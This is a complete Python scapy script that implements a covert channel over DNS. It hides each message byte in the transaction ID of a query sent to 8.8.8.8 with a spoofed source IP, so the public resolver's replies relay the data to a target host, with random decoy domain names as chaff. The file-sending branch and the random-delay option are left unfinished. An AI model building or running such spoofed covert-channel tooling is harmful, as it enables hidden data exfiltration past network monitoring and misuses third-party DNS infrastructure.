import sys
import random
from scapy.all import * 	# Packet manipulation lib
import logging
import datetime
import argparse 			# Command line menu
from unauthored import *	# Import unauthored code snippets

def main(args):	
	# Inititate Logging
	logging.basicConfig(filename='server.log', level=logging.DEBUG)
	now = datetime.datetime.now()	
	logging.info('\n\n--Program Inititated at %s', str(now))			


	# Check if anything is tbs, else exit
	if ((args.sendFile is None) and (args.message is None)):
		logging.warning('Neither direct message nor send file were selected. No action was taken.')
		sys.exit(0)

	# Load domain chaff from file, if none provided use google.com
	if (args.rchaff is not None):
		with open(args.rchaff) as f:
			chaff = f.read().splitlines()
		logging.info('Domain request chaff loaded from file')		
	else:
		chaff = ['www.google.com']
		logging.info('No fomain request chaff provided, using www.google.com')

	# If direct message is specified, send it
	if (args.message is not None):
		logging.info('Direct message \'%s\' tbs', args.message)
		for c in args.message:
			sendByte(c, args.targetIP, chaff) # Remember to pass a list of one
		logging.info('Direct message send complete')

	# If file is specified, send it

def sendByte(c, targetIP, chaff):	
	dest = '8.8.8.8' #Change to variable		
	drequest = chaff[random.randint(0,len(chaff)-1)]	

	#Checksum chaff for tID encoding
	checksum = sum(bytearray(drequest))%256
	# Encode transmission ID with checksum of drequest and byte to send
	tID = (ord(c) << 8) | checksum

	# Create spoof packet
	spoofPacket = IP(dst=dest,src=targetIP)\
		/UDP(dport=53)\
		/DNS(id=tID, qd=DNSQR(qname=drequest))

	send(spoofPacket, verbose=False)
	logging.info('Sending packet with ID=%x to Target=%s with domain request=%s', tID, targetIP, drequest)

if __name__ == '__main__':
	#Generate argparse menu
	parser = argparse.ArgumentParser()

	# Link chaff option
	parser.add_argument('--rchaff', metavar='c',
		dest='rchaff', default='domain-chaff.txt',
		help='File name of DNS request url chaff')

	# File Send
	parser.add_argument('--fsend', metavar='f',
		dest='sendFile', default=None, help='File to send')

	# Direct Message
	parser.add_argument('--dmessage',metavar='m',
		dest='message', default=None, help='Message to send')

	# Target IP
	parser.add_argument('--targetIP', metavar='t',
		dest='targetIP', help='Target IP in format ')

	parser.add_argument('--randomDelay', metavar='d')

	args = parser.parse_args()

	main(args)